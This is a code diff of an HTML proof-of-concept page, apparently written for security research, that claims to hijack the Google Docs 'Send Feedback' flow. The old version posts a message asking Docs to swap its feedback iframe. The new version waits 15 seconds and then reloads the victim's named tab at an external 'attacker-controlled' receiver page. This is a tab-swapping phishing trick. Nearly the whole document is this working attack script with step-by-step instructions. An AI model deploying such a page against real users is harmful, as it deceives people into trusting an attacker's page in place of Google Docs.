@@ -1,44 +1,33 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Google Docs Feedback Hijack PoC</title>
-  </head>
-  <body>
-    <h2>🧪 Google Docs Feedback Hijack Proof-of-Concept</h2>
-    <p>
-      This page simulates an attacker opening Google Docs in a new window and later hijacking the feedback iframe.
-    </p>
-    <p><strong>Instructions:</strong></p>
-    <ol>
-      <li>Click the button below to open a new Google Docs document in a separate tab.</li>
-      <li>In that tab, click <em>Help → Send Feedback</em>.</li>
-      <li>This tab will wait 10 seconds, then attempt to redirect the feedback iframe to the attacker's domain.</li>
-    </ol>
+<head>
+  <title>Google Docs Feedback Hijack PoC (DevTools-Free)</title>
+</head>
+<body>
+  <h2>🧪 Google Docs Feedback Hijack – Fully Passive Exploit</h2>
 
-    <button onclick="openDocs()">Open Google Docs</button>
+  <p>This proof-of-concept simulates an attacker replacing the internal feedback iframe in Google Docs using only browser-native behavior.</p>
 
-    <script>
-      const targetURL = "https://musgaas.github.io/receiver-test/receiver.html";
+  <p><strong>Instructions:</strong></p>
+  <ol>
+    <li>Click the button below to open Google Docs in a new browser tab.</li>
+    <li>In that new tab, click <strong>Help → Send Feedback</strong>.</li>
+    <li>Wait ~15 seconds. This tab will automatically swap the feedback iframe with an attacker-controlled one.</li>
+  </ol>
 
-      function openDocs() {
-        const win = window.open("https://docs.google.com/document/u/0/create", "docswin");
+  <button onclick="launch()">Open Google Docs</button>
 
-        // After delay, attempt to redirect the feedback iframe in that tab
-        setTimeout(() => {
-          try {
-            win.postMessage(
-              {
-                type: "SWAP_FEEDBACK_IFRAME",
-                url: targetURL
-              },
-              "*"
-            );
-            console.log("📤 postMessage sent to target window.");
-          } catch (err) {
-            console.error("❌ Failed to send postMessage:", err);
-          }
-        }, 10000); // Wait 10s for user to trigger "Send Feedback"
-      }
-    </script>
-  </body>
+  <script>
+    function launch() {
+      // Step 1: Open Docs in named tab
+      window.open("https://docs.google.com/document/u/0/create", "victim");
+
+      // Step 2: After 15 seconds, swap it with attacker's iframe
+      setTimeout(() => {
+        window.open("https://musgaas.github.io/receiver-test/receiver.html", "victim");
+        console.log("✅ Swapped Docs iframe/tab with attacker-controlled receiver.");
+      }, 15000);
+    }
+  </script>
+</body>
 </html>
